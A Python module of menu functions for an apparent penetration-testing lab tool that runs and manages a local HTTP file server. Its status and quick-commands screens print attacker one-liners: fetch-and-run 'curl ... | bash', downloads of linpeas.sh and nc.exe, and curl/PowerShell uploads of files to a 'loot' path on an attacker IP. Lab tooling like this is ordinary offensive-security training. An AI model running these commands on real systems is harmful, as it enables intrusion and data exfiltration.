import sys
from ...actions.server import (
    is_server_running,
    start_lab_server,
    stop_lab_server,
    restart_lab_server,
    get_server_status,
    view_server_log,
)
from ...config import Colors
from ...actions.server import is_server_running, get_server_status
from ...core.http_server import get_interface_ip
from ...core.config_manager import get_default_port
from ...actions.update_lab import(
    get_input_with_escape,
    save_lab_config,
    load_lab_config,
)


def wrap_start_server(config):
    """Start HTTP server"""
    print(f"\n{Colors.BLUE}╔══════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.BLUE}║         Start HTTP Server                ║{Colors.NC}")
    print(f"{Colors.BLUE}╚══════════════════════════════════════════╝{Colors.NC}\n")
    
    # Check if already running
    if is_server_running():
        status = get_server_status()
        print(f"{Colors.YELLOW}[!] Server is already running on port {status['port']}{Colors.NC}")
        print(f"\n{Colors.CYAN}Use 'Stop Server' or 'Restart Server' from the menu{Colors.NC}")
        return
    
    # Prompt for port
    port_input = input(f"{Colors.CYAN}Enter port [{Colors.YELLOW}8080{Colors.CYAN}]: {Colors.NC}").strip()
    port = int(port_input) if port_input.isdigit() else 8080
    
    # Start the server
    success = start_lab_server(port)
    
    if success:
        # Ask if user wants to view live log
        print(f"{Colors.CYAN}View live log? (y/n):{Colors.NC} ", end="")
        view_log = input().strip().lower()
        
        if view_log == 'y':
            print()  # Newline for cleaner display
            view_server_log(live=True)


def wrap_stop_server(config):
    """Stop HTTP server"""
    print(f"\n{Colors.BLUE}╔══════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.BLUE}║         Stop HTTP Server                 ║{Colors.NC}")
    print(f"{Colors.BLUE}╚══════════════════════════════════════════╝{Colors.NC}\n")
    
    # Check if running
    if not is_server_running():
        print(f"{Colors.YELLOW}[!] No server is currently running{Colors.NC}")
        return
    
    # Get current status
    status = get_server_status()
    
    print(f"{Colors.CYAN}Server Status:{Colors.NC}")
    print(f"  Port: {Colors.YELLOW}{status['port']}{Colors.NC}")
    print(f"  PID:  {Colors.YELLOW}{status['pid']}{Colors.NC}")
    
    if status['uptime']:
        minutes = int(status['uptime'].total_seconds() / 60)
        print(f"  Uptime: {Colors.YELLOW}{minutes} minutes{Colors.NC}")
    
    # Confirm shutdown
    print(f"\n{Colors.YELLOW}Stop the server? (y/n):{Colors.NC} ", end="")
    confirm = input().strip().lower()
    
    if confirm == 'y':
        print()  # Newline for cleaner display
        stop_lab_server()
    else:
        print(f"{Colors.YELLOW}[*] Cancelled{Colors.NC}")


def wrap_restart_server(config):
    """Restart HTTP server"""
    print(f"\n{Colors.BLUE}╔══════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.BLUE}║         Restart HTTP Server              ║{Colors.NC}")
    print(f"{Colors.BLUE}╚══════════════════════════════════════════╝{Colors.NC}\n")
    
    # Check if running
    if not is_server_running():
        print(f"{Colors.YELLOW}[!] No server is currently running{Colors.NC}")
        print(f"{Colors.CYAN}[*] Starting new server instead...{Colors.NC}\n")
        wrap_start_server(config)
        return
    
    # Get current status
    status = get_server_status()
    current_port = status.get('port', 8080)
    
    print(f"{Colors.CYAN}Current port: {Colors.YELLOW}{current_port}{Colors.NC}\n")
    
    # Ask if user wants to change port
    print(f"{Colors.CYAN}Change port? (y/n):{Colors.NC} ", end="")
    change_port = input().strip().lower()
    
    new_port = None
    if change_port == 'y':
        port_input = input(f"\n{Colors.CYAN}Enter new port [{Colors.YELLOW}{current_port}{Colors.CYAN}]: {Colors.NC}").strip()
        new_port = int(port_input) if port_input.isdigit() else current_port
    
    print()  # Newline for cleaner display
    
    # Restart the server
    restart_lab_server(new_port)


def wrap_server_status(config):
    """Show detailed server status"""
    print(f"\n{Colors.BLUE}╔══════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.BLUE}║         Server Status                    ║{Colors.NC}")
    print(f"{Colors.BLUE}╚══════════════════════════════════════════╝{Colors.NC}\n")
    
    status = get_server_status()
    
    # Display status
    if status['is_running']:
        print(f"{Colors.GREEN}Status:{Colors.NC}     {Colors.GREEN}● Running{Colors.NC}")
    else:
        print(f"{Colors.RED}Status:{Colors.NC}     {Colors.RED}○ Stopped{Colors.NC}")
    
    if status['port']:
        print(f"{Colors.GREEN}Port:{Colors.NC}       {Colors.YELLOW}{status['port']}{Colors.NC}")
    
    if status['ip']:
        print(f"{Colors.GREEN}IP:{Colors.NC}         {Colors.YELLOW}{status['ip']}{Colors.NC}")
        print(f"{Colors.GREEN}URL:{Colors.NC}        {Colors.CYAN}http://{status['ip']}:{status['port']}/{Colors.NC}")
    
    if status['pid']:
        print(f"{Colors.GREEN}PID:{Colors.NC}        {Colors.YELLOW}{status['pid']}{Colors.NC}")
    
    if status['uptime']:
        minutes = int(status['uptime'].total_seconds() / 60)
        hours = minutes // 60
        mins = minutes % 60
        
        if hours > 0:
            uptime_str = f"{hours}h {mins}m"
        else:
            uptime_str = f"{mins}m"
        
        print(f"{Colors.GREEN}Uptime:{Colors.NC}     {Colors.YELLOW}{uptime_str}{Colors.NC}")
    
    if status['log_file']:
        print(f"{Colors.GREEN}Log:{Colors.NC}        {Colors.CYAN}{status['log_file']}{Colors.NC}")
    
    # Show helpful commands if running
    if status['is_running']:
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗{Colors.NC}")
        print(f"{Colors.CYAN}║         Quick Commands                   ║{Colors.NC}")
        print(f"{Colors.CYAN}╚══════════════════════════════════════════╝{Colors.NC}\n")
        
        ip = status['ip']
        port = status['port']
        
        print(f"{Colors.YELLOW}Download file:{Colors.NC}")
        print(f"  wget http://{ip}:{port}/tools/linpeas.sh")
        print(f"  curl -O http://{ip}:{port}/tools/linpeas.sh")
        
        print(f"\n{Colors.YELLOW}Upload file:{Colors.NC}")
        print(f"  curl -X POST -F 'file=@data.txt' http://{ip}:{port}/upload/loot/data.txt")
        
        print(f"\n{Colors.YELLOW}Windows:{Colors.NC}")
        print(f"  IWR -Uri http://{ip}:{port}/tools/nc.exe -OutFile nc.exe")
    
    # Ask about viewing log
    if status['log_file']:
        print(f"\n{Colors.CYAN}View log? [l=live, r=recent, n=no]:{Colors.NC} ", end="")
        choice = input().strip().lower()
        
        if choice == 'l':
            print()  # Newline for cleaner display
            view_server_log(live=True)
        elif choice == 'r':
            print()  # Newline for cleaner display
            view_server_log(live=False)


def wrap_view_server_log(config):
    """View server log file"""
    print(f"\n{Colors.BLUE}╔══════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.BLUE}║         Server Log                       ║{Colors.NC}")
    print(f"{Colors.BLUE}╚══════════════════════════════════════════╝{Colors.NC}\n")
    
    # Check if server has ever run
    status = get_server_status()
    
    if not status['log_file']:
        print(f"{Colors.YELLOW}[!] No log file found{Colors.NC}")
        print(f"{Colors.CYAN}[*] Server has not been started yet{Colors.NC}")
        return
    
    # Ask for live or recent
    print(f"{Colors.CYAN}View mode:{Colors.NC}")
    print(f"  {Colors.GREEN}[l]{Colors.NC} Live (tail -f)")
    print(f"  {Colors.GREEN}[r]{Colors.NC} Recent (last 50 lines)")
    
    choice = input(f"\n{Colors.YELLOW}Choice [l]:{Colors.NC} ").strip().lower() or 'l'
    
    print()  # Newline for cleaner display
    
    if choice == 'l':
        view_server_log(live=True)
    elif choice == 'r':
        view_server_log(live=False)
    else:
        print(f"{Colors.YELLOW}[*] Invalid choice{Colors.NC}")

def wrap_start_stop_server(config):
    """
    Contextual server start/stop - no prompts, just do it.
    If stopped, start with defaults. If running, stop immediately.
    """
    
    if is_server_running():
        # Server is running - stop it
        status = get_server_status()
        port = status.get('port', 'unknown')
        
        print(f"\n{Colors.CYAN}[*] Stopping server (port {port})...{Colors.NC}")
        
        success = stop_lab_server()
        
        if success:
            print(f"{Colors.GREEN}[+] Server stopped successfully{Colors.NC}")
        else:
            print(f"{Colors.RED}[!] Failed to stop server{Colors.NC}")
    else:
        # Server is stopped - start it
        port = get_default_port()
        
        print(f"\n{Colors.CYAN}[*] Starting server on port {port}...{Colors.NC}")
        
        success = start_lab_server(port)
        
        if success:
            print(f"{Colors.GREEN}[+] Server started successfully{Colors.NC}")
        else:
            print(f"{Colors.RED}[!] Failed to start server{Colors.NC}")


def wrap_quick_commands(config):
    """
    Display quick copy-paste commands for file transfer.
    Uses server IP/port if running, otherwise shows attacker IP.
    """
    
    print(f"\n{Colors.BLUE}╔══════════════════════════════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.BLUE}║                    Quick Commands                                ║{Colors.NC}")
    print(f"{Colors.BLUE}╚══════════════════════════════════════════════════════════════════╝{Colors.NC}\n")
    
    # Get IP and port based on server status
    if is_server_running():
        status = get_server_status()
        ip = status.get('ip') or get_interface_ip() or "ATTACKER_IP"
        port = status.get('port', get_default_port())
        
        print(f"{Colors.GREEN}Server Status: ● Running on {ip}:{port}{Colors.NC}\n")
    else:
        # Server stopped - big red warning box
        ip = get_interface_ip() or "ATTACKER_IP"
        port = get_default_port()
        
        print(f"{Colors.RED}╔══════════════════════════════════════════════════════════════════╗{Colors.NC}")
        print(f"{Colors.RED}║                    SERVER NOT RUNNING                            ║{Colors.NC}")
        print(f"{Colors.RED}╚══════════════════════════════════════════════════════════════════╝{Colors.NC}\n")
        
        print(f"{Colors.YELLOW}[!] Start the server from the main menu to enable file serving{Colors.NC}")
        print(f"{Colors.CYAN}[*] Commands shown below use your IP: {ip}{Colors.NC}\n")
    
    # Show commands (same regardless of server status)
   # Downloads
    print(f"{Colors.CYAN}═══ Downloads ═══{Colors.NC}")
    print(f"\n{Colors.YELLOW}Linux:{Colors.NC}")
    print(f"  curl http://{ip}:{port}/FILE_NAME -o FILE_NAME")
    print(f"  curl http://{ip}:{port}/FILE_NAME | bash")
    print(f"  wget http://{ip}:{port}/FILE_NAME")
 
    print(f"\n{Colors.YELLOW}PowerShell:{Colors.NC}")
    print(f"  IWR -Uri http://{ip}:{port}/tools/FILE_NAME -OutFile FILE_NAME")
    print(f"  Invoke-WebRequest -Uri http://{ip}:{port}/tools/FILE_NAME -OutFile FILE_NAME")
    print(f"  (New-Object Net.WebClient).DownloadFile('http://{ip}:{port}/tools/FILE_NAME','FILE_NAME')")
    print(f"  curl.exe -O http://{ip}:{port}/tools/FILE_NAME")
    
 
    # Uploads
    print(f"\n{Colors.CYAN}═══ Uploads ═══{Colors.NC}")
    print(f"\n{Colors.YELLOW}Linux:{Colors.NC}")
    print(f"  curl -F \"file=@FILE_NAME\" http://{ip}:{port}/upload/loot/FILE_NAME")
    print(f"  curl -X POST --data-binary @FILE_NAME http://{ip}:{port}/upload/loot/FILE_NAME")
    
 
    print(f"\n{Colors.YELLOW}PowerShell:{Colors.NC}")
    print(f"  IWR -Uri http://{ip}:{port}/upload/loot/FILE_NAME -Method POST -InFile FILE_NAME")
    print(f"  Invoke-RestMethod -Uri http://{ip}:{port}/upload/loot/FILE_NAME -Method POST -InFile FILE_NAME")
    print(f"  (New-Object Net.WebClient).UploadFile('http://{ip}:{port}/upload/loot/FILE_NAME', 'FILE_NAME')")
    print(f"  curl.exe -X POST -F \"file=@FILE_NAME\" http://{ip}:{port}/upload/loot/FILE_NAME")
 
    print()    
    print()



def wrap_change_port(config):
    """
    Change server port and (re)start server.
    Prompts for new port, confirms, then restarts server.
    Updates labconfig.yaml with new port.
    """
    
    print(f"\n{Colors.BLUE}╔══════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.BLUE}║         Change Server Port               ║{Colors.NC}")
    print(f"{Colors.BLUE}╚══════════════════════════════════════════╝{Colors.NC}\n")
    
    # Get current port
    if is_server_running():
        status = get_server_status()
        current_port = status.get('port', get_default_port())
        print(f"{Colors.CYAN}Current port: {Colors.YELLOW}{current_port}{Colors.NC} (server running)")
    else:
        current_port = get_default_port()
        print(f"{Colors.CYAN}Default port: {Colors.YELLOW}{current_port}{Colors.NC} (server stopped)")
    
    # Prompt for new port
    new_port_input = get_input_with_escape(f"\n{Colors.YELLOW}Enter new port (ESC to cancel): {Colors.NC}")
    
    if new_port_input is None:
        return  # User cancelled with ESC
    
    if not new_port_input.isdigit():
        print(f"{Colors.RED}[!] Invalid port number{Colors.NC}")
        return
    
    new_port = int(new_port_input)
    
    # Validate port range
    if new_port < 1024 or new_port > 65535:
        print(f"{Colors.RED}[!] Port must be between 1024-65535 (non-privileged ports){Colors.NC}")
        return
    
    # Check if port is the same
    if new_port == current_port:
        print(f"{Colors.YELLOW}[*] Port unchanged ({current_port}){Colors.NC}")
        return
    
    # Confirm change (default to No)
    action = "(re)start" if is_server_running() else "start"
    print(f"\n{Colors.YELLOW}Change port to {new_port} and {action} server? (y/n) [n]:{Colors.NC} ", end="")
    
    response = input().strip().lower()
    if response != 'y':
        print(f"{Colors.YELLOW}[*] Cancelled{Colors.NC}")
        return
    
    print()  # Newline for cleaner output
    
    # Stop server if running
    if is_server_running():
        print(f"{Colors.CYAN}[*] Stopping current server...{Colors.NC}")
        stop_lab_server()
    
    # Start server on new port
    print(f"{Colors.CYAN}[*] Starting server on port {new_port}...{Colors.NC}")
    success = start_lab_server(new_port)
    
    if success:
        # Update labconfig.yaml with new port
        lab_config = load_lab_config()
        if 'runtime' not in lab_config:
            lab_config['runtime'] = {}
        lab_config['runtime']['server_port'] = new_port
        save_lab_config(lab_config)
        
        print(f"{Colors.GREEN}[+] Server started on port {new_port}{Colors.NC}")
        print(f"{Colors.GREEN}[+] Config updated with new port{Colors.NC}")
    else:
        print(f"{Colors.RED}[!] Failed to start server on port {new_port}{Colors.NC}")


__all__ = [
    "wrap_start_server",
    "wrap_stop_server",
    "wrap_restart_server",
    "wrap_server_status",
    "wrap_view_server_log",
    "wrap_start_stop_server",
    "wrap_quick_commands",
    "wrap_change_port",
]